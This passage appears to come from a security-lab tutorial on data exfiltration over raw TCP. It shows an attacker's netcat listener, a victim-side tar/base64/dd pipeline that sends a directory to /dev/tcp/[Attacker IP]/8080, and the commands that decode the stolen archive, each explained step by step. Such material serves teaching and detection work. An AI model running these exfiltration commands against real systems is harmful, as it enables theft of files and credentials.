Not recommended if in a well-secured environment. This exfiltration type is easy to detect because we rely on non-standard protocols.

**Attacker**

	nc -lvp 8080 > /tmp/task4-creds.data

**Victim**

	tar zcf - [file directory]/ | base64 | dd conv=ebcdic > /dev/tcp/[Attacker IP]/8080

Let's break down the previous command and explain it:

1. We used the tar command to create an archive file with the zcf arguments of the content of the secret directory.
2. The z is for using gzip to compress the selected folder, the c is for creating a new archive, and the f is for using an archive file.
3. We then passed the created tar file to the base64 command for converting it to base64 representation.
4. Then, we passed the result of the base64 command to create and copy a backup file with the dd command using EBCDIC encoding data.
5. Finally, we redirect the dd command's output to transfer it using the TCP socket on the specified IP and port, which in this case, port 8080

**Attacker**

	dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
	tar xvf task4-creds.tar

The following is the explanation of the previous command:

1. We used the dd command to convert the received file to ASCII  representation. We used the task4-creds.data as input to the dd command. 
2. The output of the dd command will be passed to the base64 to decode it using the -d argument.
3. Finally, we save the output in the task4-creds.tar  file.
4. We used the tar command to unarchive the file with the xvf arguments.
5. The x is for extracting the tar file, the v for verbosely listing files, and the f is for using an archive file.
